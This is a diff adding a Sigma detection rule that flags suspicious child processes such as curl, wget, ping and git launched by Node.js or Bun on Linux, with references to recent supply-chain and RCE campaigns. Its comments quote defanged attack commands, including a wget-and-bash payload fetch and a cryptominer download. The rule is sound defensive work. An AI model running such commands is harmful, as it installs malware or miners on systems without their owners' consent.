@@ -1,0 +1,51 @@
+id: 9KVfcbD1pxFF
+name: Suspicious NodeJS Child Processes [Linux] (via cmdline)
+body: |-
+  title: Suspicious NodeJS Child Processes [Linux] (via cmdline)
+  id: e24cf77d-ff3b-492c-9942-0507b45f7ffb
+  status: stable
+  description: This rule is designed to identify suspicious activities involving NodeJS child processes initiated through the command line. It is highly recommended to baseline your activity and tune out common business use cases.
+  author: SOC Prime Team
+  references:
+      - https://research.jfrog.com/post/beyond-testmetest-42-hijacked-github-repos/
+      - https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
+      - https://orca.security/resources/blog/hades-pypi-supply-chain-attack
+      - https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-CVE-2025-66478-next/
+      - https://thehackernews.com/2025/12/critical-rsc-bugs-in-react-and-nextjs.html
+      - https://github.com/assetnote/react2shell-scanner
+      - https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478
+      - https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3
+      - https://www.greynoise.io/blog/cve-2025-55182-react2shell-opportunistic-exploitation-in-the-wild-what-the-greynoise-observation-grid-is-seeing-so-far
+      - https://kmsec.uk/blog/js-malware-bigmathix/
+      - https://socket.dev/blog/stegabin-26-malicious-npm-packages-use-pastebin-steganography
+  tags:
+      - attack.execution
+      - attack.t1059.006
+      - attack.t1059.004
+  logsource:
+      category: process_creation
+      product: linux
+  detection:
+      selection:
+          ParentImage|endswith:
+              - '/node' # Node.js process https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce
+              - '/bun'   # Bun 1.4.4 https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; Hades Campaign uses Bun JS runtime as Node.js alternative
+          Image|endswith:
+              - '/curl' # malware download https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; curl -s -L hxxps[://]raw[.]githubusercontent[.]com/C3Pool/xmrig_setup/master/setup_c3pool_miner[.]sh
+              - '/wget' # malware download https://webflow.sysdig.com/blog/node2shell-cve-2026-111497-detecting-the-node-js-brotli-rce; wget http://162[.]215[.]170[.]26:3000/sex[.]sh && bash sex[.]sh; https://socket.dev/blog/stegabin-26-malicious-npm-packages-use-pastebin-steganography
+            #  - '/python' noisy.
+              - '/ping' # ping 5axzi7[.]dnslog[.]cn
+              - '/nslookup'
+              - '/cat'
+              - '/java'
+              - '/ruby'
+              - '/perl'
+              - '/systemctl' #https://kmsec.uk/blog/js-malware-bigmathix/
+              - '/git'       # Hades Campaign - exfiltrates encrypted data to attacker GitHub repos via git push
+      condition: selection
+  falsepositives:
+      - Unknown
+  level: medium
+level: medium
+created: '2025-12-08T12:29:16Z'
+updated: '2026-10-26T12:19:35.058000Z'
